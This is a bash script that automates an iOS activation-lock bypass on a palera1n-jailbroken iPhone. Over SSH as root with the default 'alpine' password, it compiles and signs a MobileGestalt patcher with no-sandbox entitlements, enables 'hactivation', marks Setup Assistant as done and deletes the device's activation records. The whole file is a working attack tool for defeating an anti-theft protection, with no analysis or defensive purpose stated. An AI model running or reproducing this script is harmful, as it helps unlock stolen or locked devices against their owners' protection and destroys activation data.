#!/usr/bin/env bash
#
# hello.sh - boot palera1n, sign gestaltpatcher over SSH,
#            mark Setup Assistant done, purge activation, reboot.
#
#
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
cd "$ROOT"

# --- config (override via env) -------------------------------------------
PALERA1N="${PALERA1N:-$ROOT/vendor/palera1n-macos-arm64}"
POC_SRC="${POC_SRC:-$ROOT/external/gestalt_hax/patcher.m}"
BUILD="$ROOT/build"
ENT_PLIST="$BUILD/ent.plist"
GESTALTPATCHER="$BUILD/gestaltpatcher"

SSH_PASS="${SSH_PASS:-alpine}"
DEVICE_HOST="${DEVICE_HOST:-127.0.0.1}"
DEVICE_PORT="${DEVICE_PORT:-2222}"

SSH=(sshpass -p "$SSH_PASS" ssh
     -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
     -o ConnectTimeout=5 -p "$DEVICE_PORT" "root@$DEVICE_HOST")
SCP=(sshpass -p "$SSH_PASS" scp -O
     -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
     -P "$DEVICE_PORT")

log() { printf '\033[1;34m[*]\033[0m %s\n' "$*"; }
die() { printf '\033[1;31m[!]\033[0m %s\n' "$*" >&2; exit 1; }

cleanup() {
  if [[ -n "${IPROXY_PID:-}" ]] && kill -0 "$IPROXY_PID" 2>/dev/null; then
    log "stopping iproxy (pid $IPROXY_PID)"
    kill "$IPROXY_PID" 2>/dev/null || true
  fi
}
trap cleanup EXIT INT TERM

# --- preflight ------------------------------------------------------------
for c in xcrun iproxy sshpass; do
  command -v "$c" >/dev/null || die "missing on host: $c (brew install ...)"
done
[[ -f "$PALERA1N" ]] || die "palera1n not found: $PALERA1N"
[[ -f "$POC_SRC"  ]] || die "poc.m not found: $POC_SRC (set POC_SRC=... to override)"
mkdir -p "$BUILD"

# --- 1) build gestaltpatcher ---------------------------------------------
log "building gestaltpatcher"
xcrun clang \
  -target arm64-apple-ios17.7 \
  -isysroot "$(xcrun --sdk iphoneos --show-sdk-path)" \
  -mios-version-min=17.0 \
  -objc -framework Foundation \
  -o "$GESTALTPATCHER" "$POC_SRC"
file "$GESTALTPATCHER"

# --- 2) write ent.plist ---------------------------------------------------
log "writing ent.plist"
cat > "$ENT_PLIST" <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>platform-application</key>
    <true/>
    <key>com.apple.private.security.no-sandbox</key>
    <true/>
    <key>get-task-allow</key>
    <true/>
</dict>
</plist>
EOF

# --- 3) run palera1n -l (foreground, wait for it to finish) ---------------
log "running palera1n -l (this drives the device, watch its output)"
"$PALERA1N" -l

# --- 4) iproxy in background ---------------------------------------------
log "starting iproxy $DEVICE_PORT -> 44 (background)"
iproxy "$DEVICE_PORT" 44 >"$BUILD/iproxy.log" 2>&1 &
IPROXY_PID=$!

# --- 5) wait for ssh ------------------------------------------------------
log "waiting for ssh on $DEVICE_HOST:$DEVICE_PORT"
for i in $(seq 1 60); do
  if "${SSH[@]}" true 2>/dev/null; then
    log "ssh is up"
    break
  fi
  [[ $i -eq 60 ]] && die "ssh never came up (see $BUILD/iproxy.log)"
  sleep 2
done

# --- 6) push ent.plist + gestaltpatcher -----------------------------------
log "pushing payload to /var/gest/"
"${SSH[@]}" 'mkdir -p /var/gest'
"${SCP[@]}" "$ENT_PLIST" "$GESTALTPATCHER" "root@$DEVICE_HOST:/var/gest/"

# --- 7) sign on device ----------------------------------------------------
log "signing gestaltpatcher with ldid"
"${SSH[@]}" 'cd /var/gest && ldid -Sent.plist gestaltpatcher && ls -la'

# --- 8) patch MobileGestalt cache for hactivation -------------------------
MG_CACHE="/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist"
log "patching MobileGestalt cache: $MG_CACHE"
"${SSH[@]}" "test -f '$MG_CACHE' && /var/gest/gestaltpatcher '$MG_CACHE'" \
  || die "gestaltpatcher failed on MobileGestalt cache (path: $MG_CACHE)"

# --- 9) enable hactivationEnabled in data_ark.plist ----------------------

log "enabling hactivationEnabled in data_ark.plist"
"${SSH[@]}" 'sh -s' <<'REMOTE'
ARK=/private/var/mobile/Library/mad/data_ark.plist
PB=/usr/libexec/PlistBuddy
mkdir -p /private/var/mobile/Library/mad

if [ ! -f "$ARK" ]; then
  cat > "$ARK" <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>hactivationEnabled</key>
    <true/>
</dict>
</plist>
PLIST
elif [ -x "$PB" ]; then
  "$PB" -c "Add :hactivationEnabled bool true" "$ARK" 2>/dev/null \
    || "$PB" -c "Set :hactivationEnabled true" "$ARK"
else
  plutil -insert hactivationEnabled -bool true "$ARK" 2>/dev/null \
    || plutil -replace hactivationEnabled -bool true "$ARK"
fi

echo "[+] data_ark.plist contents:"
if [ -x "$PB" ]; then "$PB" -c "Print" "$ARK"; else plutil -p "$ARK"; fi
REMOTE

# --- 10) mark Setup Assistant done, purge activation, clear caches -------
log "writing com.apple.purplebuddy.plist"
"${SSH[@]}" 'mkdir -p /private/var/mobile/Library/Preferences && cat > /private/var/mobile/Library/Preferences/com.apple.purplebuddy.plist' <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>SetupDone</key><true/>
  <key>SetupFinishedAllSteps</key><true/>
  <key>SetupVersion</key><integer>1</integer>
</dict>
</plist>
EOF

log "purging activation records"
"${SSH[@]}" 'for d in /var/root/Library/Lockdown/activation_records \
                        /var/mobile/Library/mad/activation_records; do
              [ -d "$d" ] && find "$d" -mindepth 1 -maxdepth 1 -exec rm -rf {} +
            done'

log "clearing purplebuddy caches"
"${SSH[@]}" 'd=/var/mobile/Library/Caches/com.apple.purplebuddy; \
             [ -d "$d" ] && find "$d" -mindepth 1 -maxdepth 1 -exec rm -rf {} +'

# --- 11) reboot jailbreak and ask to disconnect on palera1n screen --------
if [[ -n "${IPROXY_PID:-}" ]] && kill -0 "$IPROXY_PID" 2>/dev/null; then
  log "stopping iproxy (pid $IPROXY_PID)"
  kill "$IPROXY_PID" 2>/dev/null || true
  unset IPROXY_PID
fi

log "re-running palera1n"
"$PALERA1N" -l
log "disconnect the device !!!"

log "done"
